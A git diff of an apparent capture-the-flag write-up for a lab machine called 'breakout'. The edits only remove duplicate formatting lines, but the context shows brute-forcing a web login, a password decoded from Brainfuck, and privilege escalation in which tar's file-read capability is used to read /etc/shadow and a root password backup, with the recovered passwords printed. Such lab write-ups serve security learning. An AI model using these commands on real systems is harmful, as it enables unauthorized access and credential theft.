@@ -20,7 +20,6 @@ image:
 IP : 192.168.164.238
 ```
 {: .nolineno}
-{: .nolineno}
 
 ## Port Scan Results ➡️
 
@@ -69,7 +68,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 1374.00 seconds
 ```
 {: .nolineno}
-{: .nolineno}
 
 ---
 
@@ -87,7 +85,6 @@ After decoding this Brainfuck encoding I got this →
 .2uqPEfj3D<P'a-3
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now I also see port 10000 and 20000 open as http-login page lets see →
 
@@ -100,7 +97,6 @@ Now after running burpsuite for username bruteforce I got this on port 20000 →
 ```bash
 cyber : .2uqPEfj3D<P'a-3
 ```
-{: .nolineno}
 {: .nolineno}
 
 After Getting password when I logged into the website →
@@ -132,7 +128,6 @@ uid=1000(cyber) gid=1000(cyber) groups=1000(cyber),24(cdrom),25(floppy),29(audio
 cyber@breakout:~$
 ```
 {: .nolineno}
-{: .nolineno}
 
 Lets see the files →
 
@@ -161,7 +156,6 @@ acff2c9656634fdd92b71c7c91d1e01c
 cyber@breakout:~$
 ```
 {: .nolineno}
-{: .nolineno}
 
 while checking capabilities I got tar →
 
@@ -172,7 +166,6 @@ cyber@breakout:/$ getcap -r / 2>/dev/null
 cyber@breakout:/$
 ```
 {: .nolineno}
-{: .nolineno}
 
 If I can’t be root directly through executing the payload of tar into the shell so lets try to read the content of root priviledge files through this payload →
 
@@ -182,7 +175,6 @@ File read >
 LFILE=file_to_read
 tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
 ```
-{: .nolineno}
 {: .nolineno}
 
 ```bash
@@ -215,7 +207,6 @@ systemd-coredump:!*:18919::::::
 cyber@breakout:~$
 ```
 {: .nolineno}
-{: .nolineno}
 
 Now while enumeration I also found a file named as .old.pass.bak but it has root permission so lets try to open that file →
 
@@ -235,14 +226,12 @@ drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
 cyber@breakout:/var/backups$
 ```
 {: .nolineno}
-{: .nolineno}
 
 ```bash
 cyber@breakout:~$ ./tar xf /var/backups/.old_pass.bak -I '/bin/sh -c "cat 1>&2"'
 Ts&4&YurgtRX(=~h
 cyber@breakout:~$
 ```
-{: .nolineno}
 {: .nolineno}
 
 Now lets use this string value as a password of this root user →
